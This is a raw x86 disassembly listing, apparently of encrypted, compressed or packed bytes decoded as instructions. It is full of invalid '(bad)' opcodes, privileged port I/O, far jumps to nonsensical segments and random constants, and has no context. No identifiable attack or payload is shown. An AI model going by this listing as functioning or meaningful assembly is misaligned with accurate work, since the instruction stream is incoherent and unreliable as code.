  41bbc3:	es jns 0x41bbf5
  41bbc6:	repz add edi,esi
  41bbc9:	xchg   DWORD PTR [ebx-0xd],ebp
  41bbcc:	adc    ebx,ebx
  41bbce:	adc    DWORD PTR [esi+0x7f],ebp
  41bbd1:	inc    ebp
  41bbd2:	call   0xcb82:0x7ffc3aa7
  41bbd9:	in     al,dx
  41bbda:	sub    al,ch
  41bbdc:	mov    ebx,ebx
  41bbde:	sahf   
  41bbdf:	aam    0x6d
  41bbe1:	test   eax,0x712a6c1f
  41bbe6:	cmp    eax,0x34fac12f
  41bbeb:	mov    ?,WORD PTR [ecx]
  41bbed:	dec    esi
  41bbee:	popf   
  41bbef:	imul   esi,DWORD PTR [ebp+ebx*4+0x45],0xab109b5b
  41bbf7:	pop    esi
  41bbf8:	js     0x41bbf4
  41bbfa:	cmp    al,BYTE PTR [ebx]
  41bbfc:	imul   eax,DWORD PTR [edx],0x4e
  41bbff:	push   esp
  41bc00:	add    BYTE PTR [ebx-0x564dc972],ah
  41bc06:	lods   al,BYTE PTR ds:[esi]
  41bc07:	cmp    al,0x8b
  41bc09:	mov    al,0xb7
  41bc0b:	mov    ah,0x91
  41bc0d:	imul   edx,DWORD PTR [edx],0xfffffffe
  41bc10:	mov    ecx,0xc5abdae5
  41bc15:	jp     0x41bbce
  41bc17:	and    BYTE PTR [edx],0x8d
  41bc1a:	pop    es
  41bc1b:	lods   al,BYTE PTR ds:[esi]
  41bc1c:	mov    ebp,0x476094b7
  41bc21:	dec    esi
  41bc22:	aas    
  41bc23:	call   DWORD PTR [edx+esi*1-0x7e3bf3a7]
  41bc2a:	repnz add al,0x3d
  41bc2d:	sti    
  41bc2e:	pop    ds
  41bc2f:	arpl   WORD PTR ds:0xaf664bfd,dx
  41bc35:	push   edx
  41bc36:	push   ss
  41bc37:	push   esp
  41bc38:	mov    BYTE PTR [edi-0x8],al
  41bc3b:	test   BYTE PTR [ebx+edx*8-0x1a],0xe0
  41bc40:	jecxz  0x41bbcd
  41bc42:	mov    WORD PTR [edx+esi*2],?
  41bc45:	popa   
  41bc46:	leave  
  41bc47:	jne    0x41bc39
  41bc49:	fwait
  41bc4a:	lods   eax,DWORD PTR ds:[esi]
  41bc4b:	ret    0x15d9
  41bc4e:	mov    edx,0x499e4d2b
  41bc53:	mov    ds:0x315c4df4,eax
  41bc58:	dec    ecx
  41bc59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc5a:	mov    edi,0xad150f5a
  41bc5f:	aam    0xb3
  41bc61:	inc    ebx
  41bc62:	sub    eax,0xb1248ba8
  41bc67:	jmp    0x7cec:0x4951a428
  41bc6e:	clc    
  41bc6f:	ret    
  41bc70:	scas   eax,DWORD PTR es:[edi]
  41bc71:	mov    ebp,DWORD PTR [ebx-0x79]
  41bc74:	mov    esi,0x60a9d6ce
  41bc79:	(bad)  
  41bc7a:	mov    edi,0x80b0db22
  41bc7f:	shl    DWORD PTR [eax-0x68909e7f],0x27
  41bc86:	xchg   ecx,eax
  41bc87:	cmp    eax,0xc28b2b3
  41bc8c:	mov    al,ds:0x6f692a0c
  41bc91:	jns    0x41bc67
  41bc93:	lahf   
  41bc94:	mov    eax,0x252b2b67
  41bc99:	out    0x41,eax
  41bc9b:	dec    eax
  41bc9c:	sub    esp,DWORD PTR [eax+0x21d345d4]
  41bca2:	fst    QWORD PTR [ecx-0x2c]
  41bca5:	inc    ecx
  41bca6:	imul   edx,DWORD PTR [ebp-0x62d8700f],0x69
  41bcad:	mov    al,ds:0xc9bfb81c
  41bcb2:	and    BYTE PTR [edx],ch
  41bcb4:	dec    esp
  41bcb5:	or     cl,bl
  41bcb7:	mov    al,0xac
  41bcb9:	mov    ch,0xdb
  41bcbb:	repz pop edi
  41bcbd:	daa    
  41bcbe:	and    DWORD PTR [eax],esp
  41bcc0:	push   eax
  41bcc1:	call   0x251f:0xdf84929
  41bcc8:	sub    al,0xb1
  41bcca:	mov    eax,ebp
  41bccc:	fisub  DWORD PTR ds:0x26cc4f6
  41bcd2:	stos   BYTE PTR es:[edi],al
  41bcd3:	hlt    
  41bcd4:	add    dh,BYTE PTR [ecx]
  41bcd6:	and    BYTE PTR [eax+edi*1+0x5c],ah
  41bcda:	in     eax,0xec
  41bcdc:	jp     0x41bc7b
  41bcde:	rol    DWORD PTR [ebx+0x54ae0add],cl
  41bce4:	loope  0x41bd41
  41bce6:	rcr    BYTE PTR fs:[ecx+0x6f],1
  41bcea:	mov    al,al
  41bcec:	out    dx,al
  41bced:	mov    edx,0xa6e9d91d
  41bcf2:	add    eax,0xb7712f43
  41bcf7:	out    dx,eax
  41bcf8:	pop    es
  41bcf9:	into   
  41bcfa:	(bad)  
  41bcfc:	jo     0x41bd6c
  41bcfe:	mov    bl,0xec
  41bd00:	cmp    eax,0xb6eaabf0
  41bd05:	xchg   edx,eax
  41bd06:	mov    al,0x41
  41bd08:	pop    edi
  41bd09:	scas   al,BYTE PTR es:[edi]
  41bd0a:	sub    ch,bh
  41bd0c:	mov    ch,0xcf
  41bd0e:	push   ebx
  41bd0f:	cli    
  41bd10:	push   ebp
  41bd11:	mov    esp,0x4ffbdc29
  41bd16:	clc    
  41bd17:	add    BYTE PTR [ecx+0x2d],0xc8
  41bd1b:	mov    al,ds:0xa94a500f
  41bd20:	in     al,dx
  41bd21:	push   eax
  41bd22:	hlt    
  41bd23:	xchg   esp,eax
  41bd24:	push   ebp
  41bd25:	mov    esp,0xa0de2dd6
  41bd2a:	add    al,bl
  41bd2c:	jl     0x41bd3e
  41bd2e:	test   eax,0x812b0b2f
  41bd33:	jae    0x41bd3e
  41bd35:	mov    al,0xc4
  41bd37:	adc    ebp,esi
  41bd39:	dec    edx
  41bd3a:	pop    edx
  41bd3b:	push   ecx
  41bd3c:	stos   DWORD PTR es:[edi],eax
  41bd3d:	mov    eax,ds:0xa217f133
  41bd42:	mov    BYTE PTR [edi+0x11de33b9],ch
  41bd48:	mov    ecx,0x38c34c2
  41bd4d:	(bad)  
  41bd4e:	mov    ch,0x48
  41bd50:	aaa    
  41bd51:	inc    ebx
  41bd52:	mov    ecx,0xd5c7675b
  41bd57:	repz pop es
  41bd59:	pushf  
  41bd5a:	mov    al,0xda
  41bd5c:	loop   0x41bd6e
  41bd5e:	retf   0xe37c
  41bd61:	hlt    
  41bd62:	mov    cl,0xf
  41bd64:	sub    al,0x13
  41bd66:	loope  0x41bd00
  41bd68:	mov    ah,0x4a
  41bd6a:	les    esp,FWORD PTR [edi+0x5e]
  41bd6d:	and    esp,ebp
  41bd6f:	call   0x7fc94c1a
  41bd74:	retf   
  41bd75:	dec    eax
  41bd76:	xchg   DWORD PTR [edi],edi
  41bd78:	mov    ds:0x2d35d1ac,eax
  41bd7d:	cmp    al,BYTE PTR [ecx*4+0x31799959]
  41bd84:	mov    esi,0xacae0f79
  41bd89:	(bad)  
  41bd8a:	pop    edx
  41bd8b:	sub    eax,DWORD PTR [eax-0x58]
  41bd8e:	xor    eax,0x8efc49d5
  41bd93:	data16 outs dx,BYTE PTR ds:[esi]
  41bd95:	outs   dx,DWORD PTR ds:[esi]
  41bd96:	mov    ds:0xde2665ad,eax
  41bd9b:	or     eax,0x56143657
  41bda0:	out    dx,al
  41bda1:	mov    edi,0x5684acf2
  41bda6:	push   esp
  41bda7:	loopne 0x41bd33
  41bda9:	int    0x79
  41bdab:	enter  0xfdd3,0x30
  41bdaf:	xor    ch,BYTE PTR [ecx-0x1d4917e5]
  41bdb5:	jb     0x41bd56
  41bdb7:	ret    0x700e
  41bdba:	fcomp  st(5)
  41bdbc:	(bad)  
  41bdbd:	in     al,dx
  41bdbe:	or     al,0x73
  41bdc0:	(bad)  
  41bdc1:	push   ecx
  41bdc2:	jmp    0x9be:0xefeda00f
  41bdc9:	add    al,0x86
  41bdcb:	dec    ecx
  41bdcc:	pop    eax
  41bdcd:	shl    BYTE PTR ds:0x7fce89e0,cl
  41bdd3:	xor    BYTE PTR [ebx+0x2a],dl
  41bdd6:	not    BYTE PTR [ecx+0x56]
  41bdd9:	mov    ds:0xd4a48da7,al
  41bdde:	fwait
  41bddf:	or     dl,ah
  41bde1:	dec    eax
  41bde2:	inc    ebp
  41bde3:	push   eax
  41bde4:	in     eax,0xff
  41bde6:	sahf   
  41bde7:	sub    bh,BYTE PTR [ecx]
  41bde9:	jns    0x41bd7a
  41bdeb:	outs   dx,BYTE PTR ds:[esi]
  41bdec:	out    dx,al
  41bded:	or     bl,BYTE PTR ds:[ebx-0x2a6928e0]
  41bdf4:	loope  0x41be17
  41bdf6:	addr16 jmp 0x41be6a
  41bdf9:	ficom  DWORD PTR [esi+0x66]
  41bdfc:	inc    edi
  41bdfd:	inc    ebx
  41bdfe:	jle    0x41bd88
  41be00:	mov    bl,0xc4
  41be02:	xchg   ecx,eax
  41be03:	test   eax,0xeb931b1e
  41be08:	test   BYTE PTR [edx-0x197835ae],dl
  41be0e:	mov    BYTE PTR [edi+0x4e17665],ah
  41be14:	xchg   BYTE PTR ds:0x4e3f89c6,cl
  41be1a:	lds    edx,FWORD PTR [ebx+ebx*1+0x65983f43]
  41be21:	inc    ecx
  41be22:	aad    0x4c
  41be24:	mov    ebp,0xde08b32c
  41be29:	sbb    al,bh
  41be2b:	jge    0x41be67
  41be2d:	sbb    edi,edx
  41be2f:	test   DWORD PTR [edi+0x649e5d1f],edx
  41be35:	scas   eax,DWORD PTR es:[edi]
  41be36:	aam    0x9f
  41be38:	dec    ebx
  41be39:	pusha  
  41be3a:	pop    DWORD PTR [ebx+0x86b29e]
  41be40:	clc    
  41be41:	jo     0x41be32
  41be43:	mov    esp,0x263351c9
  41be48:	jge    0x41be39
  41be4a:	ss xchg sp,ax
  41be4d:	test   dh,al
  41be4f:	paddw  mm2,QWORD PTR [edx+ebx*2]
  41be53:	outs   dx,DWORD PTR ds:[esi]
  41be54:	mov    eax,ds:0xd0ec2723
  41be59:	sbb    dh,BYTE PTR [ecx+0x6]
  41be5c:	cmp    eax,0x7a823294
  41be61:	and    edi,ebp
  41be63:	adc    eax,0x779c8d95
  41be68:	pop    ss
  41be69:	mov    ah,0x27
  41be6b:	jmp    0x574daa6d
  41be70:	ja     0x41be0a
  41be72:	xchg   ebx,eax
  41be73:	jns    0x41be0c
  41be75:	dec    ecx
  41be76:	(bad)  
  41be78:	inc    ebx
  41be79:	pop    es
  41be7a:	mov    ecx,0x4e55a2ed
  41be7f:	test   BYTE PTR [edx+0x6554b1c6],dl
  41be85:	cs jnp 0x41be49
  41be88:	scas   eax,DWORD PTR es:[edi]
  41be89:	jg     0x41beb3
  41be8b:	dec    esp
  41be8c:	push   esp
  41be8d:	push   ecx
  41be8e:	inc    edi
  41be8f:	neg    ecx
  41be91:	jg     0x41beda
  41be93:	cmc    
  41be94:	or     eax,0x1dbb392a
  41be99:	jg     0x41bee6
  41be9b:	bound  ebx,QWORD PTR [ecx-0x12]
  41be9e:	cmp    al,0xde
  41bea0:	pop    esi
  41bea1:	scas   eax,DWORD PTR es:[edi]
  41bea2:	mov    bh,0x6e
  41bea4:	(bad)  
  41bea5:	jmp    0xead6f94c
  41beaa:	mov    ebp,0xab32d70c
  41beaf:	ror    DWORD PTR ds:0xd96eb58c,cl
  41beb5:	jg     0x41bedf
  41beb7:	mov    eax,ds:0xad5994b3
  41bebc:	addr16 retf 
  41bebe:	mov    cl,0xed
  41bec0:	add    al,0xf8
  41bec2:	add    BYTE PTR [esi-0x46],ch
  41bec5:	xor    al,bh
  41bec7:	xchg   edi,eax
  41bec8:	test   BYTE PTR [eax],ch
  41beca:	xor    ah,BYTE PTR [edx-0x70]
  41becd:	stos   DWORD PTR es:[edi],eax
  41bece:	(bad)  
  41becf:	pop    esi
  41bed0:	loop   0x41be8f
  41bed2:	add    DWORD PTR [eax],ebp
  41bed4:	jl     0x41becf
  41bed6:	add    esi,ecx
  41bed8:	ds add eax,0x2461ec8a
  41bede:	add    al,0x21
  41bee0:	test   eax,0x907ac261
  41bee5:	mov    BYTE PTR [esi-0x21be0958],bh
  41beeb:	test   ebx,ebx
  41beed:	out    dx,eax
  41beee:	mov    edi,0xd7ce126d
  41bef3:	or     DWORD PTR [esi+eax*4-0x7c425b88],edi
  41befa:	mov    eax,ds:0xc6db1501
  41beff:	arpl   WORD PTR [ecx-0x1dd6c55c],dx
  41bf05:	int3   
  41bf06:	shl    cl,cl
  41bf08:	call   0x7315:0xabab8232
  41bf0f:	or     BYTE PTR [edi+0x60aa03de],0xd
  41bf16:	test   al,0x2d
  41bf18:	sbb    eax,0xeaabbb2e
  41bf1d:	lds    esi,FWORD PTR [edx]
  41bf1f:	mov    bh,0x9f
  41bf21:	mov    dl,0x5b
  41bf23:	loopne 0x41bed7
  41bf25:	stc    
  41bf26:	sbb    al,0x57
  41bf28:	ss gs xchg ebp,eax
  41bf2b:	jl     0x41bf0e
  41bf2d:	loopne 0x41bf92
  41bf2f:	mov    bh,0x8e
  41bf31:	xchg   ebp,eax
  41bf32:	pushf  
  41bf33:	jbe    0x41bf2b
  41bf35:	push   0x74
  41bf37:	ds hlt 
  41bf39:	js     0x41bf50
  41bf3b:	shr    BYTE PTR [eax+0x3676eb1f],1
  41bf41:	jl     0x41bf6e
  41bf43:	loope  0x41bec8
  41bf45:	bound  ecx,QWORD PTR [edx+esi*8]
  41bf48:	sti    
  41bf49:	arpl   WORD PTR [ebp-0x17],sp
  41bf4c:	fsubr  DWORD PTR [edi-0x64]
  41bf4f:	or     ebp,esp
  41bf51:	mov    eax,ds:0x634d0293
  41bf56:	mov    edx,0x9648655f
  41bf5b:	or     ebx,DWORD PTR [edx+ebx*2]
  41bf5e:	adc    ecx,DWORD PTR [esi+0x4ad8f486]
  41bf64:	lods   al,BYTE PTR ds:[esi]
  41bf65:	push   edx
  41bf66:	ret    
  41bf67:	pop    es
  41bf68:	pop    edx
  41bf69:	pop    eax
  41bf6a:	cmc    
  41bf6b:	call   0xc43d:0x2a290187
  41bf72:	dec    ebp
  41bf73:	sbb    ecx,DWORD PTR [esi-0x4]
  41bf76:	cmp    dl,BYTE PTR [edi-0x40]
  41bf79:	adc    DWORD PTR [edi+0x1f1cef48],0x1b491be9
  41bf83:	stc    
  41bf84:	repnz or edx,eax
  41bf87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf88:	adc    BYTE PTR [eax+0x15],dh
  41bf8b:	xchg   ebx,eax
  41bf8c:	in     eax,dx
  41bf8d:	stos   DWORD PTR es:[edi],eax
  41bf8e:	dec    esp
  41bf8f:	mov    al,ds:0x372896c2
  41bf94:	dec    edx
  41bf95:	shr    DWORD PTR [eax],1
  41bf97:	pop    ebx
  41bf98:	push   0xf42eb288
  41bf9d:	pop    edx
  41bf9e:	mov    edi,DWORD PTR [ebp-0x99b87]
  41bfa4:	inc    esp
  41bfa5:	or     cl,cl
  41bfa7:	jl     0x41bfd7
  41bfa9:	xor    al,0x8c
  41bfab:	xor    bh,dh
  41bfad:	ret    0xeb4d
  41bfb0:	sbb    dl,ah
  41bfb2:	jecxz  0x41bf59
  41bfb4:	(bad)  
  41bfb5:	hlt    
  41bfb6:	mov    DWORD PTR [eax+0x26dbf851],esp
  41bfbc:	sahf   
  41bfbd:	xchg   ecx,eax
  41bfbe:	cmp    BYTE PTR [esi],ah
  41bfc0:	jl     0x41c00a
  41bfc2:	retf   
  41bfc3:	cmp    esi,DWORD PTR [edi]
  41bfc5:	inc    ebx
  41bfc6:	cmp    cl,BYTE PTR ds:0x151dada
  41bfcc:	pop    eax
  41bfcd:	cs pop edx
  41bfcf:	xchg   esi,eax
  41bfd0:	push   edi
  41bfd1:	push   ecx
  41bfd2:	adc    edx,esp
  41bfd4:	fmul   DWORD PTR [ecx+0x50]
  41bfd7:	test   DWORD PTR [ebp+0x3d1d17aa],ecx
  41bfdd:	push   ecx
  41bfde:	das    
  41bfdf:	dec    ecx
  41bfe0:	xor    BYTE PTR [ecx-0x606c747c],dh
  41bfe6:	or     al,0xa
  41bfe8:	inc    esi
  41bfe9:	or     DWORD PTR [ebx-0x65],ebp
  41bfec:	jns    0x41c051
  41bfee:	xchg   BYTE PTR [edx],al
  41bff0:	xor    BYTE PTR [ebx+0xadfa468],ch
  41bff6:	or     al,0x22
  41bff8:	jl     0x41bfb3
  41bffa:	ret    
  41bffb:	fstp   DWORD PTR [ebx+0x3]
  41bffe:	adc    al,0x5e
  41c000:	and    BYTE PTR ds:0xcee6f2d4,0x6c
  41c007:	xor    al,0x20
  41c009:	popa   
  41c00a:	(bad)  
  41c00b:	push   cs
  41c00c:	cmp    al,0xa
  41c00e:	cmp    eax,0x9bfd6b0f
  41c013:	mov    al,ds:0xc0c60784
  41c018:	mov    esp,0x9f9cf5ea
  41c01d:	retf   
  41c01e:	loop   0x41bfee
  41c020:	scas   eax,DWORD PTR es:[edi]
  41c021:	xchg   edi,eax
  41c022:	fsubr  QWORD PTR [esi+ebp*4+0x49]
  41c026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c027:	mov    eax,0xe4858289
  41c02c:	mov    ah,0xeb
  41c02e:	cld    
  41c02f:	mov    dl,0x8a
  41c031:	and    edx,DWORD PTR [eax+0x6e05efb7]
  41c037:	cmp    DWORD PTR [eax-0x6680515a],eax
  41c03d:	inc    ecx
  41c03e:	ss jns 0x41c03e
  41c041:	addr16 mov ebp,0x86aa8d4a
  41c047:	cmp    bl,BYTE PTR [ebp+0x7b36fc03]
  41c04d:	pop    ss
  41c04e:	rcr    DWORD PTR [esi-0x68ebe3fc],cl
  41c054:	test   al,0x6c
  41c056:	mov    dl,BYTE PTR [esi]
  41c058:	mov    al,ds:0xaa7a3c03
  41c05d:	ret    
  41c05e:	xchg   ebp,eax
  41c05f:	sub    bh,BYTE PTR [ebp+0x21]
  41c062:	mov    edx,0xadbe34e9
  41c067:	rcl    DWORD PTR [ebp-0x5ae2f3ef],0xc3
  41c06e:	ret    0x4bc5
  41c071:	(bad)  
  41c072:	out    0xcc,eax
  41c074:	das    
  41c075:	inc    edi
  41c076:	mov    bh,0x78
  41c078:	mov    al,0x74
  41c07a:	xor    BYTE PTR [eax+0x1d1f1d95],ah
  41c080:	fcmovu st,st(0)
  41c082:	idiv   DWORD PTR [esp]
  41c085:	test   eax,0x57ad98a3
  41c08a:	aaa    
  41c08b:	push   ebp
  41c08c:	xchg   BYTE PTR [esi-0x7a],dh
  41c08f:	(bad)  
  41c090:	lods   eax,DWORD PTR ds:[esi]
  41c091:	lahf   
  41c092:	popf   
  41c093:	or     DWORD PTR [ebp+0x5b9c0bdc],esi
  41c099:	inc    edx
  41c09a:	adc    esp,DWORD PTR ds:0xf1227085
  41c0a0:	shl    dl,cl
  41c0a2:	stos   DWORD PTR es:[edi],eax
  41c0a3:	jo     0x41c0fb
  41c0a5:	aam    0x3f
  41c0a7:	cmp    al,0xe9
  41c0a9:	loope  0x41c033
  41c0ab:	xor    bh,bl
  41c0ad:	pop    ebx
  41c0ae:	aaa    
  41c0af:	sahf   
  41c0b0:	fld    TBYTE PTR [ebx-0x4e]
  41c0b3:	dec    esi
  41c0b4:	test   BYTE PTR [edx+0x88c0f27],cl
  41c0ba:	int3   
  41c0bb:	mov    ecx,0xfffe8157
  41c0c0:	add    DWORD PTR [eax-0x644bc90c],ecx
  41c0c6:	sbb    eax,0xe91c2575
  41c0cb:	(bad)  
  41c0cc:	and    BYTE PTR [esi],bh
  41c0ce:	sub    DWORD PTR [eax],0xffffffb5
  41c0d1:	clc    
  41c0d2:	dec    eax
  41c0d3:	outs   dx,BYTE PTR ds:[esi]
  41c0d4:	pop    ss
  41c0d5:	or     dl,BYTE PTR ds:0xf29e2945
  41c0db:	frstor [ebp+edi*4-0x17b2be20]
  41c0e2:	daa    
  41c0e3:	jbe    0x41c084
  41c0e5:	jnp    0x41c08f
  41c0e7:	pop    eax
  41c0e8:	adc    dh,ch
  41c0ea:	push   ds
  41c0eb:	rcl    BYTE PTR [ebp+0x703df736],1
  41c0f1:	data16 fisubr DWORD PTR [ecx]
  41c0f4:	jmp    0x25bd:0xe69d9827
  41c0fb:	adc    DWORD PTR [edi],edi
  41c0fd:	(bad)  
  41c0fe:	dec    esi
  41c0ff:	rcl    DWORD PTR [ebx+0x4bcb8ee5],cl
  41c105:	add    edx,edi
  41c107:	ret    
  41c108:	mov    bh,0xbe
  41c10a:	outs   dx,DWORD PTR ds:[esi]
  41c10b:	hlt    
  41c10c:	pushf  
  41c10d:	inc    ebx
  41c10e:	call   0x341af499
  41c113:	test   DWORD PTR [edi],edx
  41c115:	retf   
  41c116:	sbb    eax,0x5ccffa53
  41c11b:	ret    0x1f08
  41c11e:	mov    edi,0xe3863acc
  41c123:	inc    ecx
  41c124:	jge    0x41c162
  41c126:	inc    ecx
  41c127:	adc    al,0x45
  41c129:	or     ebp,DWORD PTR [ebx]
  41c12b:	dec    esi
  41c12c:	dec    edx
  41c12d:	rcr    DWORD PTR [edx],1
  41c12f:	dec    ebx
  41c130:	fwait
  41c131:	mov    ch,0x9c
  41c133:	xor    DWORD PTR [ecx+eax*8-0x2d],esi
  41c137:	mov    cl,0xcf
  41c139:	ins    BYTE PTR es:[edi],dx
  41c13a:	pop    ebx
  41c13b:	stos   DWORD PTR es:[edi],eax
  41c13c:	ds mov ebx,0xbb7a070b
  41c142:	fs call 0x1925cd2
  41c148:	pop    esi
  41c149:	cmp    eax,0xa08a3673
  41c14e:	in     al,dx
  41c14f:	sub    al,0x81
  41c151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c152:	les    esi,FWORD PTR [esi]
  41c154:	adc    ebp,DWORD PTR [edx+eiz*8-0x80]
  41c158:	add    DWORD PTR ds:0x5dfe10da,ebx
  41c15e:	add    BYTE PTR [ebx-0xc1abce7],al
  41c164:	fiadd  DWORD PTR [ecx]
  41c166:	mov    esp,0x6f31c1b3
  41c16b:	add    dh,BYTE PTR [esp+eax*1]
  41c16e:	sub    DWORD PTR [esi],0xffffff8b
  41c171:	jae    0x41c16d
  41c173:	aam    0xdb
  41c175:	ja     0x41c19b
  41c177:	mov    ?,WORD PTR [ebx-0x4d]
  41c17a:	lods   eax,DWORD PTR ds:[esi]
  41c17b:	push   ebp
  41c17c:	add    DWORD PTR [ebp+ebp*8+0x49355fd6],esi
  41c183:	ins    BYTE PTR es:[edi],dx
  41c184:	pop    ds
  41c185:	dec    esp
  41c186:	cli    
  41c187:	push   edi
  41c188:	in     eax,0x2f
  41c18a:	and    BYTE PTR [edi],dh
  41c18c:	fsub   DWORD PTR [edi+esi*2]
  41c18f:	or     bl,BYTE PTR [ecx+0x3d214c32]
  41c195:	dec    ecx
  41c196:	sbb    eax,0x6482572d
  41c19b:	mov    esp,0x403acff4
  41c1a0:	adc    dh,BYTE PTR [edi-0x4e]
  41c1a3:	push   ecx
  41c1a4:	jl     0x41c181
  41c1a6:	jae    0x41c19a
  41c1a8:	repnz adc eax,0x4950b7a2
  41c1ae:	jb     0x41c158
  41c1b0:	fiadd  WORD PTR [ebp-0x73337c9c]
  41c1b6:	test   DWORD PTR [ebx-0x712f1d51],ebx
  41c1bc:	inc    edi
  41c1bd:	add    ecx,ebx
  41c1bf:	mov    ah,0x28
  41c1c1:	in     al,0xed
  41c1c3:	xchg   edx,eax
  41c1c4:	ds mov bh,0xcd
  41c1c7:	cmc    
  41c1c8:	pop    edi
  41c1c9:	cmp    eax,0x18c87474
  41c1ce:	test   DWORD PTR [esi],edi
  41c1d0:	lods   eax,DWORD PTR ds:[esi]
  41c1d1:	mov    esp,ss
  41c1d3:	xor    BYTE PTR [eax],bh
  41c1d5:	xchg   BYTE PTR cs:[esi+0xe],ah
  41c1d9:	jne    0x41c1b0
  41c1db:	das    
  41c1dc:	or     ecx,eax
  41c1de:	test   DWORD PTR [esi+0x95ce323],0x4054393f
  41c1e8:	and    eax,eax
  41c1ea:	mov    ebp,0x9626c341
  41c1ef:	fst    QWORD PTR [edx]
  41c1f1:	cwde   
  41c1f2:	repz mov ds:0xa8e5f3bf,eax
  41c1f8:	dec    edi
  41c1f9:	je     0x41c1e6
  41c1fb:	mov    edx,0x4c0cca2a
  41c200:	imul   ebx,DWORD PTR [eax*2+0x47cd50a8],0xffffff88
  41c208:	es stc 
  41c20a:	push   cs
  41c20b:	push   eax
  41c20c:	(bad)  
  41c20d:	jmp    0xb456:0xd2be3e03
  41c214:	pop    ebp
  41c215:	outs   dx,BYTE PTR ds:[esi]
  41c216:	ja     0x41c1c7
  41c218:	in     eax,dx
  41c219:	push   ss
  41c21a:	scas   al,BYTE PTR es:[edi]
  41c21b:	jo     0x41c258
  41c21d:	stos   DWORD PTR es:[edi],eax
  41c21e:	push   edx
  41c21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c220:	adc    bl,BYTE PTR [ebx+0x5cb9b0a1]
  41c226:	pop    ebx
  41c227:	mov    BYTE PTR [edi],bl
  41c229:	xor    cl,0x4c
  41c22c:	pop    es
  41c22d:	scas   eax,DWORD PTR es:[edi]
  41c22e:	mov    ebp,0x2b7b012
  41c233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c234:	push   ecx
  41c235:	or     edx,DWORD PTR [esi]
  41c237:	mov    ds:0x168eb832,eax
  41c23c:	add    al,0xf3
  41c23e:	in     eax,dx
  41c23f:	jle    0x41c268
  41c241:	and    BYTE PTR [edx-0x51],dh
  41c244:	daa    
  41c245:	shr    eax,1
  41c247:	adc    BYTE PTR [esi+eiz*2+0x72],0x47
  41c24c:	scas   eax,DWORD PTR es:[edi]
  41c24d:	adc    eax,0xb6ab7194
  41c252:	shl    DWORD PTR [edx+0x3e0a1d95],1
  41c258:	test   eax,0xb0b54ea7
  41c25d:	sbb    eax,0x809d4ef5
  41c262:	push   edi
  41c263:	adc    eax,0xca519463
  41c268:	xor    al,0x51
  41c26a:	cmp    BYTE PTR [edi],dh
  41c26c:	and    DWORD PTR ss:[eax],edi
  41c26f:	sbb    al,0x94
  41c271:	jbe    0x41c244
  41c273:	push   0xf73bb8e3
  41c278:	jecxz  0x41c2f5
  41c27a:	cmp    al,0x69
  41c27c:	(bad)  
  41c27d:	jb     0x41c2eb
  41c27f:	cld    
  41c280:	and    al,0xb6
  41c282:	mov    cl,0xb4
  41c284:	out    0x9d,al
  41c286:	aad    0x79
  41c288:	xchg   ebx,eax
  41c289:	pop    edi
  41c28a:	mov    DWORD PTR ds:0x428ecf76,esp
  41c290:	jp     0x41c2bc
  41c292:	sub    BYTE PTR [ecx+edx*4],bh
  41c295:	popa   
  41c296:	lock inc ebp
  41c298:	repnz inc ebx
  41c29a:	or     eax,0x38aaf6fe
  41c29f:	jo     0x41c221
  41c2a1:	mov    dh,0x70
  41c2a3:	cmp    al,0x96
  41c2a5:	ret    0xaf4f
  41c2a8:	inc    eax
  41c2a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2aa:	sar    BYTE PTR [edi+0x29],1
  41c2ad:	mov    ebp,0x3efa1ce0
  41c2b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2b3:	rol    DWORD PTR [ebx+0x54567531],1
  41c2b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2ba:	sbb    BYTE PTR [ebp+0x11],dh
  41c2bd:	das    
  41c2be:	inc    eax
  41c2bf:	faddp  st(7),st
  41c2c1:	and    eax,0x62774132
  41c2c6:	pop    ebx
  41c2c7:	fcom   st(4)
  41c2c9:	cmp    eax,0xac0a9961
  41c2ce:	into   
  41c2cf:	jmp    DWORD PTR [edx]
  41c2d1:	sti    
  41c2d2:	mov    ds:0x296da19e,eax
  41c2d7:	mov    esi,ecx
  41c2d9:	test   BYTE PTR [ebp-0x11],bl
  41c2dc:	(bad)  
  41c2dd:	int    0xa4
  41c2df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2e0:	xchg   edi,ebx
  41c2e2:	sub    DWORD PTR ss:[edi+0x7632928e],ebx
  41c2e9:	dec    edx
  41c2ea:	aaa    
  41c2eb:	scas   eax,DWORD PTR es:[edi]
  41c2ec:	sub    DWORD PTR [eax-0xc],edx
  41c2ef:	jno    0x41c2e9
  41c2f1:	mov    bh,0xd7
  41c2f3:	in     al,dx
  41c2f4:	es and eax,0x4eb4ddad
  41c2fa:	rol    BYTE PTR [ebx-0x29],0xe9
  41c2fe:	xor    DWORD PTR [edi-0x4],edi
  41c301:	add    ch,dh
  41c303:	shl    DWORD PTR [ebx+0x3fedb17],cl
  41c309:	leave  
  41c30a:	popf   
  41c30b:	ins    DWORD PTR es:[edi],dx
  41c30c:	addr16 pop es
  41c30e:	sub    DWORD PTR [ebx],0x2b
  41c311:	ret    
  41c312:	push   esp
  41c313:	push   cs
  41c314:	cwde   
  41c315:	pop    ss
  41c316:	mov    ecx,0xd26b71ea
  41c31b:	push   es
  41c31c:	sbb    DWORD PTR [ebx+0x6],edi
  41c31f:	daa    
  41c320:	out    0xb7,al
  41c322:	xchg   ecx,eax
  41c323:	sbb    ch,cl
  41c325:	mov    esp,0x7b427f76
  41c32a:	xor    dh,0xf4
  41c32d:	in     eax,dx
  41c32e:	inc    ebp
  41c32f:	pop    ss
  41c330:	push   ecx
  41c331:	fdiv   st,st(0)
  41c333:	pop    eax
  41c334:	pop    edi
  41c335:	mov    al,0x29
  41c337:	dec    edx
  41c338:	or     eax,0x2f58ab35
  41c33d:	mov    bh,BYTE PTR [ebp+0x20]
  41c340:	(bad)  
  41c341:	pop    ss
  41c342:	loop   0x41c378
  41c344:	add    cl,BYTE PTR [edx+0x3c]
  41c347:	xchg   ecx,eax
  41c348:	xchg   edx,edx
  41c34a:	stos   BYTE PTR es:[edi],al
  41c34b:	in     eax,dx
  41c34c:	out    dx,al
